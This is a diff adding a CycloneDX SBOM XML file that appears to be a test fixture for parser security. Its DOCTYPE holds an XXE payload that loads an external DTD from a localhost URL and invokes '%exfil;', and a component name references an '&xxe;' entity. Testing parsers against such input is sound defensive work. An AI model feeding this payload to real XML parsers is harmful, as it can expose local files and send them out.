@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bom [<!ENTITY % sp SYSTEM "https://localhost:1010/test/593ab443b77890d052e55899b16b61a8/raw/3cdd376bba0007145fa2bbacb9abe36cbd5a43ce/file.dtd"> %sp; %param1; %exfil;]>
+<bom xmlns="http://cyclonedx.org/schema/bom/1.5" serialNumber="urn:uuid:3e671687-395b-41f5-a30f-a58921a69b79">
+    <components>
+        <component type="application">
+            <name>Example Application &#x26;xxe;3</name>
+            <version>2.1.0</version>
+            <description>This is an example application</description>
+            <licenses>
+                <license>
+                    <id>Apache-2.0</id>
+                </license>
+            </licenses>
+            <purl>pkg:npm/example-app@2.1.0</purl>
+        </component>
+        <component type="library">
+            <name>Example Library</name>
+            <version>3.2.1</version>
+            <licenses>
+                <license>
+                    <id>MIT</id>
+                </license>
+            </licenses>
+            <purl>pkg:npm/example-lib@3.2.1</purl>
+        </component>
+    </components>
+</bom>
